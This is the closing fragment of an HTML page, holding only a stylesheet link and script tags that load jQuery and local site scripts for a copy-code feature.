</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
